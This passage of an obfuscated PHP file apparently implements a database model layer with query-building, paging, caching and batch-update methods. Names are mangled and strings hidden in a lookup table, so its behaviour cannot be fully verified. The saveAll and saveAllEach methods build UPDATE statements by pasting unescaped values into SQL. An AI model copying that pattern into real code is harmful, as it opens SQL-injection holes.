(NULL === $ª‡ÓêÅ›) { $¡‹Åñ¡•[$“‹ªõ´ú]->close(); unset($¡‹Åñ¡•[$“‹ªõ´ú]); return; } if (!empty($èä¬Ç‘)) { if (is_string($èä¬Ç‘)) { parse_str($èä¬Ç‘, $èä¬Ç‘); } foreach ($èä¬Ç‘ as $Óë´ù»… => $ê£÷Õ‹¢) { $this->setProperty($Óë´ù»…, $ê£÷Õ‹¢); } } $ĞãäÆÙÈ[$“‹ªõ´ú] = $ª‡ÓêÅ›; $this->db = $¡‹Åñ¡•[$“‹ªõ´ú]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $…°ß•²Ì = get_class($this); if ($…°ß•²Ì == $_SERVER[ÏÒ Ì„][344]) { return $this->name; } $this->name = substr($…°ß•²Ì, 0, -5); } return $this->name; } public function getTableName() { $“®›±Ê¢ =& $_SERVER[ÏÒ Ì„]; if (empty($this->trueTableName)) { $‘ÆÒ¬± = !empty($this->tablePrefix) ? $this->tablePrefix : $“®›±Ê¢[33]; if (!empty($this->tableName)) { $‘ÆÒ¬± .= $this->tableName; } else { $‘ÆÒ¬± .= think_parse_name($this->name); } $this->trueTableName = strtolower($‘ÆÒ¬±); } return (!empty($this->dbName) ? $this->dbName . $“®›±Ê¢[95] : $“®›±Ê¢[33]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $˜Ï­Ó =& $_SERVER[ÏÒ Ì„]; return isset($this->fields[$˜Ï­Ó[249]]) ? $this->fields[$˜Ï­Ó[249]] : $this->pk; } public function getDbFields() { $öÁ‡ıò† =& $_SERVER[ÏÒ Ì„]; if (isset($this->options[$öÁ‡ıò†[277]])) { $û•×¢ú = $this->db->getFields($this->options[$öÁ‡ıò†[277]]); return $û•×¢ú ? array_keys($û•×¢ú) : !1; } if ($this->fields) { $û•×¢ú = $this->fields; unset($û•×¢ú[$öÁ‡ıò†[248]], $û•×¢ú[$öÁ‡ıò†[249]], $û•×¢ú[$öÁ‡ıò†[250]], $û•×¢ú[$öÁ‡ıò†[247]]); return $û•×¢ú; } return !1; } public function data($€ÇÊ©È‚ = '') { $¨èüà†“ =& $_SERVER[ÏÒ Ì„]; if ($¨èüà†“[33] === $€ÇÊ©È‚ && !empty($this->data)) { return $this->data; } if (is_object($€ÇÊ©È‚)) { $€ÇÊ©È‚ = get_object_vars($€ÇÊ©È‚); } elseif (is_string($€ÇÊ©È‚)) { parse_str($€ÇÊ©È‚, $€ÇÊ©È‚); } elseif (!is_array($€ÇÊ©È‚)) { think_exception(think_lang($¨èüà†“[269])); } $this->data = $€ÇÊ©È‚; return $this; } public function join($œÊùà‰È) { $ˆûÕ²ÕÀ =& $_SERVER[ÏÒ Ì„]; if (is_array($œÊùà‰È)) { $this->options[$ˆûÕ²ÕÀ[280]] = $œÊùà‰È; } elseif (!empty($œÊùà‰È)) { $this->options[$ˆûÕ²ÕÀ[280]][] = $œÊùà‰È; } return $this; } public function union($ù”Ê–Ë, $°è½À‚ù = false) { $÷¾×¾—” =& $_SERVER[ÏÒ Ì„]; if (empty($ù”Ê–Ë)) { return $this; } if ($°è½À‚ù) { $this->options[$÷¾×¾—”[345]][$÷¾×¾—”[346]] = !0; } if (is_object($ù”Ê–Ë)) { $ù”Ê–Ë = get_object_vars($ù”Ê–Ë); } if (is_string($ù”Ê–Ë)) { $¨™®…… = $ù”Ê–Ë; } elseif (is_array($ù”Ê–Ë)) { if (isset($ù”Ê–Ë[0])) { $this->options[$÷¾×¾—”[345]] = array_merge($this->options[$÷¾×¾—”[345]], $ù”Ê–Ë); return $this; } else { $¨™®…… = $ù”Ê–Ë; } } else { think_exception(think_lang($÷¾×¾—”[269])); } $this->options[$÷¾×¾—”[345]][] = $¨™®……; return $this; } public function cache($åÙÉ€’ü = true, $úˆúÌ€É = null, $Œ½Ö“¥Û = '') { $¸Ö÷¼œã =& $_SERVER[ÏÒ Ì„]; if (!1 !== $åÙÉ€’ü) { $this->options[$¸Ö÷¼œã[347]] = array($¸Ö÷¼œã[93] => $åÙÉ€’ü, $¸Ö÷¼œã[337] => $úˆúÌ€É, $¸Ö÷¼œã[29] => $Œ½Ö“¥Û); } return $this; } public function field($×ÇĞ°Šù, $Ø¨¢Ä = false) { $Ó²ÏØÌ =& $_SERVER[ÏÒ Ì„]; if (!0 === $×ÇĞ°Šù) { $¡åü±ÒÓ = $this->getDbFields(); $×ÇĞ°Šù = $¡åü±ÒÓ ? $¡åü±ÒÓ : $Ó²ÏØÌ[182]; } elseif ($Ø¨¢Ä) { if (is_string($×ÇĞ°Šù)) { $×ÇĞ°Šù = explode($Ó²ÏØÌ[47], $×ÇĞ°Šù); } $¡åü±ÒÓ = $this->getDbFields(); $×ÇĞ°Šù = $¡åü±ÒÓ ? array_diff($¡åü±ÒÓ, $×ÇĞ°Šù) : $×ÇĞ°Šù; } $this->options[$Ó²ÏØÌ[271]] = $×ÇĞ°Šù; return $this; } public function scope($ÖÈĞîôï = '', $Òï·˜çì = NULL) { $€Íïäğ× =& $_SERVER[ÏÒ Ì„]; if ($€Íïäğ×[33] === $ÖÈĞîôï) { if (isset($this->_scope[$€Íïäğ×[34]])) { $†ûÅ¾ª = $this->_scope[$€Íïäğ×[34]]; } else { return $this; } } elseif (is_string($ÖÈĞîôï)) { $¶Á©¸ú = explode($€Íïäğ×[47], $ÖÈĞîôï); $†ûÅ¾ª = array(); foreach ($¶Á©¸ú as $çâò¢¿) { if (!isset($this->_scope[$çâò¢¿])) { continue; } $†ûÅ¾ª = array_merge($†ûÅ¾ª, $this->_scope[$çâò¢¿]); } if (!empty($Òï·˜çì) && is_array($Òï·˜çì)) { $†ûÅ¾ª = array_merge($†ûÅ¾ª, $Òï·˜çì); } } elseif (is_array($ÖÈĞîôï)) { $†ûÅ¾ª = $ÖÈĞîôï; } if (is_array($†ûÅ¾ª) && !empty($†ûÅ¾ª)) { $this->options = array_merge($this->options, array_change_key_case($†ûÅ¾ª)); } return $this; } public function where($¦Ùª×’È, $À°çÊÚ = null) { $£µ£³©Š =& $_SERVER[ÏÒ Ì„]; if (!is_null($À°çÊÚ) && is_string($¦Ùª×’È)) { if (!is_array($À°çÊÚ)) { $À°çÊÚ = func_get_args(); array_shift($À°çÊÚ); } $À°çÊÚ = array_map(array($this->db, $£µ£³©Š[341]), $À°çÊÚ); $¦Ùª×’È = vsprintf($¦Ùª×’È, $À°çÊÚ); } elseif (is_object($¦Ùª×’È)) { $¦Ùª×’È = get_object_vars($¦Ùª×’È); } elseif (is_array($¦Ùª×’È)) { foreach ($¦Ùª×’È as $©ª¢‘€º => $¶ññ„’¨) { if ((is_numeric($©ª¢‘€º) || !$©ª¢‘€º) && is_string($¶ññ„’¨)) { if (strpos($¶ññ„’¨, $£µ£³©Š[348]) === 0) { continue; } think_trace($£µ£³©Š[349], $£µ£³©Š[33], $£µ£³©Š[46]); die; } } } if (is_string($¦Ùª×’È) && $£µ£³©Š[33] != $¦Ùª×’È) { $ŠãÈ«¥ = array(); $ŠãÈ«¥[$£µ£³©Š[350]] = $¦Ùª×’È; $¦Ùª×’È = $ŠãÈ«¥; } if (isset($this->options[$£µ£³©Š[273]])) { $this->options[$£µ£³©Š[273]] = array_merge($this->options[$£µ£³©Š[273]], $¦Ùª×’È); } else { $this->options[$£µ£³©Š[273]] = $¦Ùª×’È; } return $this; } public function limit($ÄÕ„Ë–, $é°ÖŒ‘ = null) { $§ãÅ“«ø =& $_SERVER[ÏÒ Ì„]; $this->options[$§ãÅ“«ø[290]] = is_null($é°ÖŒ‘) ? $ÄÕ„Ë– : $ÄÕ„Ë– . $§ãÅ“«ø[47] . $é°ÖŒ‘; return $this; } public function page($¢±¬¡Æ, $©º³·¤¬ = null) { $û ºÓä =& $_SERVER[ÏÒ Ì„]; $this->options[$û ºÓä[351]] = is_null($©º³·¤¬) ? $¢±¬¡Æ : $¢±¬¡Æ . $û ºÓä[47] . $©º³·¤¬; return $this; } public function comment($ìÚªñÉ) { $this->options[$_SERVER[ÏÒ Ì„][352]] = $ìÚªñÉ; return $this; } public function setProperty($¼å”Öò¤, $°ûí—û) { if (property_exists($this, $¼å”Öò¤)) { $this->{$¼å”Öò¤} = $°ûí—û; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\155\157\144\151\146\171\x54\x69\155\x65", "\164\151\x6d\x65", "\151\x6e\x73\145\x72\164\x2c\x75\x70\x64\x61\x74\x65", "\x66\165\156\143\x74\151\x6f\x6e"), array("\143\162\145\x61\164\x65\124\x69\x6d\145", "\164\151\155\x65", "\x69\x6e\163\145\x72\x74", "\x66\165\x6e\143\164\151\157\156")); public function setDataAuto($ˆ“¹Õô) { $this->dataAuto = $ˆ“¹Õô; } public function __construct($×¹Ô‚¤ = '', $úãŠ’û½ = '', $Óµ‹ì³ø = '') { parent::__construct($×¹Ô‚¤, $úãŠ’û½, $Óµ‹ì³ø); } protected $tableMeta = array(); protected function _beforeInsert(&$ÈöÕ…°¥, $¬º•ùé) { $ÍìÀ–„ë =& $_SERVER[ÏÒ Ì„]; if (!$this->checkDataAutoHas($ÍìÀ–„ë[353])) { return; } $this->dataBeforeFilter($ÈöÕ…°¥, $ÍìÀ–„ë[353]); } protected function _beforeUpdate(&$û¼†Úˆ, $ûØ¿š³) { $şµĞ€Ùö =& $_SERVER[ÏÒ Ì„]; if (!$this->checkDataAutoHas($şµĞ€Ùö[354])) { return; } $this->dataBeforeFilter($û¼†Úˆ, $şµĞ€Ùö[354]); } protected function _afterSelect(&$ËÄÁŞ×à, $ñáÒŞÛ) { if (!is_array($ËÄÁŞ×à)) { return; } if (!$this->checkDataAutoHas($_SERVER[ÏÒ Ì„][355])) { return; } foreach ($ËÄÁŞ×à as &$«äè«®ì) { $this->dataAfterFilter($«äè«®ì); } unset($«äè«®ì); } protected function _afterFind(&$ı£òÇĞÙ, $ä¯Õ³üƒ) { if (!is_array($ı£òÇĞÙ)) { return; } if (!$this->checkDataAutoHas($_SERVER[ÏÒ Ì„][355])) { return; } $this->dataAfterFilter($ı£òÇĞÙ); } public static function textEncode($†ÖéıÔ) { if (!$†ÖéıÔ) { return $†ÖéıÔ; } $ŒÔóÀú½ = json_encode($†ÖéıÔ); $ŒÔóÀú½ = preg_replace_callback($_SERVER[ÏÒ Ì„][356], function ($ñøä­ˆ¸) { return addslashes($ñøä­ˆ¸[0]); }, $ŒÔóÀú½); return json_decode($ŒÔóÀú½); } public static function textDecode($í©ò•êë) { $ÜÎŞº˜‹ =& $_SERVER[ÏÒ Ì„]; $ŠìĞù×÷ = json_encode($í©ò•êë); $ŠìĞù×÷ = preg_replace_callback($ÜÎŞº˜‹[357], function ($€†Ş¯Àó) { return $_SERVER[ÏÒ Ì„][97]; }, $ŠìĞù×÷); return json_decode($ŠìĞù×÷); } public function setAutoIncrement($“£†çòî) { $ú£‚üÑÑ = array($this->getPk() => $“£†çòî); $²œØÏæÕ = $this->data($ú£‚üÑÑ)->add(); if ($²œØÏæÕ) { $this->delete($²œØÏæÕ); } } public function getAutoIncrement() { $‰ù¯ô×¾ = $this->getTableName(); $øÎÛ± = $this->max($this->getPk()); $†ÊµèÁ = $this->query("\x73\x68\x6f\167\40\164\x61\142\x6c\x65\x20\163\164\x61\164\165\163\x20\167\150\145\x72\145\x20\x4e\141\x6d\145\x3d\47{$‰ù¯ô×¾}\47"); $«£˜ï—¾ = $†ÊµèÁ[0][$_SERVER[ÏÒ Ì„][358]]; $ûÕ¦§Øò = max($øÎÛ±, $«£˜ï—¾); return $ûÕ¦§Øò; } protected function _callBefore($…ëšÅå, $ô‘“âåí) { return $this->cacheCallCheck($…ëšÅå, $ô‘“âåí, !1); } protected function _callAfter($’§¥ÊÃò, $ûÎ®´ÖÀ) { return $this->cacheCallCheck($’§¥ÊÃò, $ûÎ®´ÖÀ, !0); } protected function cacheFunctionAlias($éÔ®‡…½) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($ÓğÉ†ë“, $áÜÎÚİÑ, $Ÿ°ú¶ö° = false) { $™ßÄ‰ó¹ = $this->cacheFunctionAlias($áÜÎÚİÑ); if (!$™ßÄ‰ó¹) { return; } foreach ($™ßÄ‰ó¹ as $°êëä»Ë => $çÁŒ•Á) { $î›Õ€¹Ï = $çÁŒ•Á[0]; $¬ÁÚˆØÁ = explode($_SERVER[ÏÒ Ì„][47], $çÁŒ•Á[1]); if ($ÓğÉ†ë“ == $°êëä»Ë) { return $this->cacheFunctionGet($°êëä»Ë, $î›Õ€¹Ï); } if ($Ÿ°ú¶ö° && in_array($ÓğÉ†ë“, $¬ÁÚˆØÁ)) { $this->cacheFunctionClear($°êëä»Ë, $î›Õ€¹Ï); } } } public function cacheFunctionGet($¬ğ¤òö, $®¹Âˆ¨ª) { $‡šËÇ‡ = $this->cacheKeyMake($¬ğ¤òö, $®¹Âˆ¨ª); $¸í’Â = Cache::get($‡šËÇ‡); if (!is_array($¸í’Â)) { $¸í’Â = call_user_func_array(array($this, $¬ğ¤òö), array($®¹Âˆ¨ª, !0)); Cache::set($‡šËÇ‡, $¸í’Â); } return $¸í’Â; } public function cacheFunctionClear($ÙôŠ‡ÉÅ, $”ñú÷¹ò) { $»ãìá¾ = $”ñú÷¹ò; if (!is_array($”ñú÷¹ò)) { $»ãìá¾ = array($”ñú÷¹ò); } foreach ($»ãìá¾ as $óø˜¯) { $ê±×ÌËâ = $this->cacheKeyMake($ÙôŠ‡ÉÅ, $óø˜¯); Cache::remove($ê±×ÌËâ); } } private function cacheKeyMake($­š­ë‘, $‡‹®º§Ş) { $†Ç¤ó‡ó =& $_SERVER[ÏÒ Ì„]; return get_class($this) . $†Ç¤ó‡ó[71] . $­š­ë‘ . $†Ç¤ó‡ó[359] . $‡‹®º§Ş; } protected function selectPageReset() { $ŞÚ‘¸Šµ =& $_SERVER[ÏÒ Ì„]; if (isset($GLOBALS[$ŞÚ‘¸Šµ[360]])) { return; } $GLOBALS[$ŞÚ‘¸Šµ[360]] = isset($GLOBALS[$ŞÚ‘¸Šµ[7]][$ŞÚ‘¸Šµ[361]]) ? $GLOBALS[$ŞÚ‘¸Šµ[7]][$ŞÚ‘¸Šµ[361]] : !1; $GLOBALS[$ŞÚ‘¸Šµ[362]] = isset($GLOBALS[$ŞÚ‘¸Šµ[7]][$ŞÚ‘¸Šµ[351]]) ? $GLOBALS[$ŞÚ‘¸Šµ[7]][$ŞÚ‘¸Šµ[351]] : !1; $GLOBALS[$ŞÚ‘¸Šµ[7]][$ŞÚ‘¸Šµ[361]] = !1; $GLOBALS[$ŞÚ‘¸Šµ[7]][$ŞÚ‘¸Šµ[351]] = !1; } protected function selectPageRestore() { $’¨Åñ¡ =& $_SERVER[ÏÒ Ì„]; if (!isset($GLOBALS[$’¨Åñ¡[360]])) { return; } $GLOBALS[$’¨Åñ¡[7]][$’¨Åñ¡[361]] = $GLOBALS[$’¨Åñ¡[360]]; $GLOBALS[$’¨Åñ¡[7]][$’¨Åñ¡[351]] = $GLOBALS[$’¨Åñ¡[362]]; if ($GLOBALS[$’¨Åñ¡[7]][$’¨Åñ¡[361]] === !1) { unset($GLOBALS[$’¨Åñ¡[7]][$’¨Åñ¡[361]]); } if ($GLOBALS[$’¨Åñ¡[7]][$’¨Åñ¡[351]] === !1) { unset($GLOBALS[$’¨Åñ¡[7]][$’¨Åñ¡[351]]); } unset($GLOBALS[$’¨Åñ¡[360]]); unset($GLOBALS[$’¨Åñ¡[362]]); } protected function selectPage($»ûß’§ = 200, $™î¶æßÆ = 1) { $º›ô¸‚ =& $_SERVER[ÏÒ Ì„]; global $in; $™³–º§™ = $this->optionsValue(); $Êš“Ë™‘ = 50000; $»ûß’§ = isset($in[$º›ô¸‚[361]]) && $in[$º›ô¸‚[361]] ? $in[$º›ô¸‚[361]] : $»ûß’§; if ($»ûß’§ === -1) { $in[$º›ô¸‚[361]] = !1; $Êš“Ë™‘ = 100000000; $»ûß’§ = $Êš“Ë™‘; } $÷…§¸¤¸ = $™³–º§™; $÷…§¸¤¸[$º›ô¸‚[363]] = array(); $»ûß’§ = intval($»ûß’§); $»ûß’§ = $»ûß’§ <= 5 ? 5 : ($»ûß’§ >= $Êš“Ë™‘ ? $Êš“Ë™‘ : $»ûß’§); $™î¶æßÆ = intval(isset($in[$º›ô¸‚[351]]) && $in[$º›ô¸‚[351]] ? $in[$º›ô¸‚[351]] : $™î¶æßÆ); $™î¶æßÆ = $™î¶æßÆ <= 1 ? 1 : $™î¶æßÆ; $µß§ÍÎ = array(); $É©Ä‚²Æ = 1; if ($™î¶æßÆ == 1 && $É©Ä‚²Æ) { $this->optionsValue($™³–º§™); $µß§ÍÎ = $this->page($™î¶æßÆ, $»ûß’§)->select(); $›ÇÖÒû– = is_array($µß§ÍÎ) ? count($µß§ÍÎ) : 0; if ($›ÇÖÒû– < $»ûß’§) { $±ãØÔøÚ = 1; } else { $this->optionsValue($÷…§¸¤¸); $›ÇÖÒû– = intval($this->count()); $±ãØÔøÚ = ceil($›ÇÖÒû– / $»ûß’§); } } else { $this->optionsValue($÷…§¸¤¸); $›ÇÖÒû– = intval($this->count()); $±ãØÔøÚ = ceil($›ÇÖÒû– / $»ûß’§); $™î¶æßÆ = $™î¶æßÆ >= $±ãØÔøÚ ? $±ãØÔøÚ : $™î¶æßÆ; $this->optionsValue($™³–º§™); $µß§ÍÎ = $this->page($™î¶æßÆ, $»ûß’§)->select(); } if (!is_array($µß§ÍÎ)) { $µß§ÍÎ = array(); } if ($±ãØÔøÚ == 1) { $›ÇÖÒû– = count($µß§ÍÎ); } $“—ù˜„Š = array($º›ô¸‚[364] => array($º›ô¸‚[365] => $›ÇÖÒû–, $º›ô¸‚[361] => $»ûß’§, $º›ô¸‚[351] => $™î¶æßÆ, $º›ô¸‚[366] => $±ãØÔøÚ), $º›ô¸‚[367] => $µß§ÍÎ); return $“—ù˜„Š; } protected function checkLength($õ–¢†Òç, $š¿¿Œ÷ = 0, $ù˜…†íö = '') { $ÄÇ­¢ñİ =& $_SERVER[ÏÒ Ì„]; $š¿¿Œ÷ = $š¿¿Œ÷ ? $š¿¿Œ÷ : 65536; if (!$õ–¢†Òç || strlen($õ–¢†Òç) < $š¿¿Œ÷) { return; } $ù˜…†íö = $ù˜…†íö ? $ù˜…†íö . $ÄÇ­¢ñİ[68] : $ÄÇ­¢ñİ[33]; show_json($ù˜…†íö . LNG($ÄÇ­¢ñİ[368]) . "\x28{$š¿¿Œ÷}\x29", !1); } protected function metaSet($ö¡”Î±, $Ã±¼¾ªï = null, $Ö¤ô‡Ú± = null) { $Ş€ù…ü² =& $_SERVER[ÏÒ Ì„]; if (!$this->tableMeta || !$ö¡”Î±) { return !1; } $ˆŸ¢‡Öù = $this->tableMeta[$Ş€ù…ü²[369]]; $ö¢ËµÚ§ = $this->tableMeta[$Ş€ù…ü²[370]]; $íÌıÀìæ = Model($ö¢ËµÚ§); $ñÁ£•Éˆ = array($ˆŸ¢‡Öù => $ö¡”Î±, $Ş€ù…ü²[371] => $Ã±¼¾ªï); if (is_null($Ã±¼¾ªï)) { return $íÌıÀìæ->where(array($ˆŸ¢‡Öù => $ö¡”Î±))->delete(); } if (is_null($Ö¤ô‡Ú±) && is_string($Ã±¼¾ªï)) { return $íÌıÀìæ->where($ñÁ£•Éˆ)->delete(); } $•‡àÊ—¶ = is_array($Ã±¼¾ªï) ? $Ã±¼¾ªï : array(); if (is_string($Ã±¼¾ªï)) { $•‡àÊ—¶[$Ã±¼¾ªï] = $Ö¤ô‡Ú±; } $Æ—ÇıÚË = array(); foreach ($•‡àÊ—¶ as $Äå½şˆ => $íÕ‚ÁÚ) { if (is_null($íÕ‚ÁÚ) && is_string($Äå½şˆ)) { $íÌıÀìæ->where(array($ˆŸ¢‡Öù => $ö¡”Î±, $Ş€ù…ü²[371] => $Äå½şˆ))->delete(); continue; } $this->checkLength($íÕ‚ÁÚ, !1, $ö¢ËµÚ§ . $Ş€ù…ü²[4] . $Äå½şˆ); $Æ—ÇıÚË[] = array($ˆŸ¢‡Öù => $ö¡”Î±, $Ş€ù…ü²[93] => $Äå½şˆ, $Ş€ù…ü²[372] => $íÕ‚ÁÚ); } $öÃÕğØ = $Ş€ù…ü²[373] . $ö¢ËµÚ§; CacheLock::lock($öÃÕğØ); $íÌıÀìæ->where(array($ˆŸ¢‡Öù => $ö¡”Î±))->addAll($Æ—ÇıÚË, array(), !0); CacheLock::unlock($öÃÕğØ); return !0; } public function metaGet($“íÂÖ, $á‰ñÀšœ = false) { $À¦¼ÎÕ˜ =& $_SERVER[ÏÒ Ì„]; if (!$this->tableMeta) { return array(); } $•óÁû¼¤ = $this->tableMeta[$À¦¼ÎÕ˜[369]]; $Úñá²ã— = Model($this->tableMeta[$À¦¼ÎÕ˜[370]]); if ($á‰ñÀšœ) { $úò“è»² = array($•óÁû¼¤ => $“íÂÖ, $À¦¼ÎÕ˜[93] => $á‰ñÀšœ); return $Úñá²ã—->where($úò“è»²)->getField($À¦¼ÎÕ˜[372]); } $úò“è»² = array($•óÁû¼¤ => $“íÂÖ); $¡ş¢¸ìÍ = $Úñá²ã—->field($À¦¼ÎÕ˜[374])->where($úò“è»²)->select(); $¡ş¢¸ìÍ = array_to_keyvalue($¡ş¢¸ìÍ, $À¦¼ÎÕ˜[93], $À¦¼ÎÕ˜[372]); return $¡ş¢¸ìÍ; } private function checkDataAutoHas($¡¯ºŠĞš) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $ª­›¿€) { if (in_array($¡¯ºŠĞš, explode($_SERVER[ÏÒ Ì„][47], $ª­›¿€[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$—¨—æ€, $Ú·’÷é²) { $«ÂÒÇöå =& $_SERVER[ÏÒ Ì„]; foreach ($this->dataAuto as $ŸÇ´í) { $Š¢¹åç¯ = $ŸÇ´í[0]; if (!in_array($Ú·’÷é², explode($«ÂÒÇöå[47], $ŸÇ´í[2]))) { continue; } switch (trim($ŸÇ´í[3])) { case $«ÂÒÇöå[319]: case $«ÂÒÇöå[320]: $¦Çş´ = $ŸÇ´í[1]; $ù¶œìã = isset($ŸÇ´í[4]) ? (array) $ŸÇ´í[4] : array(); if ($¦Çş´ == $«ÂÒÇöå[197] && array_key_exists($Š¢¹åç¯, $—¨—æ€)) { if (!$—¨—æ€[$Š¢¹åç¯]) { unset($—¨—æ€[$Š¢¹åç¯]); } break; } if (isset($—¨—æ€[$Š¢¹åç¯])) { array_unshift($ù¶œìã, $—¨—æ€[$Š¢¹åç¯]); } if ($«ÂÒÇöå[319] == $ŸÇ´í[3]) { $—¨—æ€[$Š¢¹åç¯] = call_user_func_array($¦Çş´, $ù¶œìã); } else { $—¨—æ€[$Š¢¹åç¯] = call_user_func_array(array(&$this, $¦Çş´), $ù¶œìã); } break; case $«ÂÒÇöå[268]: if (isset($—¨—æ€[$Š¢¹åç¯]) && $—¨—æ€[$Š¢¹åç¯]) { $—¨—æ€[$Š¢¹åç¯] = call_user_func_array(array(&$this, $ŸÇ´í[1]), array($—¨—æ€[$Š¢¹åç¯])); } break; case $«ÂÒÇöå[271]: $—¨—æ€[$Š¢¹åç¯] = $—¨—æ€[$ŸÇ´í[1]]; break; case $«ÂÒÇöå[292]: if (isset($—¨—æ€[$Š¢¹åç¯]) && !is_string($—¨—æ€[$Š¢¹åç¯])) { $—¨—æ€[$Š¢¹åç¯] = json_encode_force($—¨—æ€[$Š¢¹åç¯]); } break; case $«ÂÒÇöå[321]: if ($—¨—æ€[$Š¢¹åç¯] === $«ÂÒÇöå[33]) { unset($—¨—æ€[$Š¢¹åç¯]); } break; case $«ÂÒÇöå[322]: $—¨—æ€[$Š¢¹åç¯] = $ŸÇ´í[1]; default: break; } } if ($Ú·’÷é² == $«ÂÒÇöå[353]) { $¢‰í Á‘ = strtolower($this->db->getDbType()); if (strpos($¢‰í Á‘, $«ÂÒÇöå[9]) !== 0) { return; } $ú¶‘¨Â = $this->field(!0)->fields; $ËÕ¢…î± = $ú¶‘¨Â[$«ÂÒÇöå[250]]; if (isset($ú¶‘¨Â[$«ÂÒÇöå[249]])) { unset($ËÕ¢…î±[$ú¶‘¨Â[$«ÂÒÇöå[249]]]); } foreach ($ËÕ¢…î± as $Æùİİ°Ü => $Ú·’÷é²) { if (!isset($—¨—æ€[$Æùİİ°Ü])) { $—¨—æ€[$Æùİİ°Ü] = $«ÂÒÇöå[33]; } } } } private function dataAfterFilter(&$™ğµäÄø) { $éËŠõãÆ =& $_SERVER[ÏÒ Ì„]; foreach ($this->dataAuto as $¢‹ ¦ü¬) { $õß×ßÛª = $¢‹ ¦ü¬[0]; if (!isset($™ğµäÄø[$õß×ßÛª])) { continue; } if (!in_array($éËŠõãÆ[355], explode($éËŠõãÆ[47], $¢‹ ¦ü¬[2]))) { continue; } switch (trim($¢‹ ¦ü¬[3])) { case $éËŠõãÆ[319]: case $éËŠõãÆ[320]: $²Ì¨–†ü = isset($¢‹ ¦ü¬[4]) ? (array) $¢‹ ¦ü¬[4] : array(); array_unshift($²Ì¨–†ü, $™ğµäÄø[$õß×ßÛª]); if (isset($¢‹ ¦ü¬[4]) && $¢‹ ¦ü¬[4] == $éËŠõãÆ[375]) { $²Ì¨–†ü = array($™ğµäÄø[$õß×ßÛª]); } if ($éËŠõãÆ[319] == $¢‹ ¦ü¬[3]) { $™ğµäÄø[$õß×ßÛª] = call_user_func_array($¢‹ ¦ü¬[1], $²Ì¨–†ü); } else { $™ğµäÄø[$õß×ßÛª] = call_user_func_array(array(&$this, $¢‹ ¦ü¬[1]), $²Ì¨–†ü); } break; case $éËŠõãÆ[268]: if (isset($™ğµäÄø[$õß×ßÛª]) && $™ğµäÄø[$õß×ßÛª]) { $™ğµäÄø[$õß×ßÛª] = call_user_func_array(array(&$this, $¢‹ ¦ü¬[1]), array($™ğµäÄø[$õß×ßÛª])); } break; case $éËŠõãÆ[271]: $™ğµäÄø[$õß×ßÛª] = $™ğµäÄø[$¢‹ ¦ü¬[1]]; break; case $éËŠõãÆ[292]: $ª—Ç„Á = $™ğµäÄø[$õß×ßÛª]; $™ğµäÄø[$õß×ßÛª] = json_decode($ª—Ç„Á, !0); if (is_null($™ğµäÄø[$õß×ßÛª])) { $™ğµäÄø[$õß×ßÛª] = $ª—Ç„Á; } break; case $éËŠõãÆ[321]: if ($™ğµäÄø[$õß×ßÛª] === $éËŠõãÆ[33]) { unset($™ğµäÄø[$õß×ßÛª]); } break; case $éËŠõãÆ[322]: $™ğµäÄø[$õß×ßÛª] = $¢‹ ¦ü¬[1]; break; default: break; } } } public function saveAll($”Ç§ô©) { $¥‚ãİÚä =& $_SERVER[ÏÒ Ì„]; $‰ì¢¿Ó— = $this->tablePrefix . $this->tableName; $…ä•÷Çû = self::SQL_WHERE_IN_CHUNK; $”Ç§ô© = is_array($”Ç§ô©) ? $”Ç§ô© : array(); $ ğÇçÑÀ = $¥‚ãİÚä[376]; $›ÈÏ‰ ş = 0; $¢”›íá¼ = array(); $«”™´öÚ = count($”Ç§ô©); for ($ç‘Šù© = 0; $ç‘Šù© < $«”™´öÚ; $ç‘Šù©++) { $‘œù§ = $”Ç§ô©[$ç‘Šù©]; if (!is_array($‘œù§) || count($‘œù§) != 4) { continue; } $êä‘´Ÿ¸ = "\x55\x50\x44\x41\x54\x45\40\x60{$‰ì¢¿Ó—}\x60\x20\123\105\124\x20{$‘œù§[2]}\40\x3d\x20\x43\x41\123\105\40{$‘œù§[0]}\40\12"; if ($›ÈÏ‰ ş == 0) { $ ğÇçÑÀ = $êä‘´Ÿ¸; } $¢”›íá¼[] = $¥‚ãİÚä[116] . $‘œù§[1] . $¥‚ãİÚä[116]; $›ÈÏ‰ ş++; $ ğÇçÑÀ .= "\x20\127\110\105\116\40\47{$‘œù§[1]}\x27\40\x54\x48\x45\x4e\x20\47{$‘œù§[3]}\x27\40\12"; if ($›ÈÏ‰ ş == $…ä•÷Çû || $ç‘Šù© == $«”™´öÚ - 1) { $Ş‚¹‡Ã÷ = implode($¥‚ãİÚä[47], $¢”›íá¼); $ ğÇçÑÀ .= "\40\x45\116\104\40\x20\x57\110\105\x52\105\40{$‘œù§[0]}\40\111\x4e\40\50{$Ş‚¹‡Ã÷}\51\40"; $this->execute($ ğÇçÑÀ); $›ÈÏ‰ ş = 0; $ ğÇçÑÀ = $êä‘´Ÿ¸; $this->chunkEventCheck(count($¢”›íá¼)); $¢”›íá¼ = array(); } } $this->chunkEventSet(); } public function saveAllEach($Ú¿÷õÕ¾) { $§‡Ãš¬ =& $_SERVER[ÏÒ Ì„]; $û³ÆÕê¿ = $this->tablePrefix . $this->tableName; foreach ($Ú¿÷õÕ¾ as $Ñ™Úë€) { if (!is_array($Ñ™Úë€) || count($Ñ™Úë€) != 4) { continue; } $Ñõõ’ª´ = $Ñ™Úë€[0] . $§‡Ãš¬[377] . $Ñ™Úë€[1] . $§‡Ãš¬[116]; $Œíœ Ã¾ = $Ñ™Úë€[2] . $§‡Ãš¬[377] . $Ñ™Úë€[3] . $§‡Ãš¬[116]; $–µĞ¬ã“ = "\x75\160\144\x61\164\x65\40{$û³ÆÕê¿}\x20\x73\145\x74\40{$Œíœ Ã¾}\40\167\150\145\x72\145\x20{$Ñõõ’ª´}\x3b"; 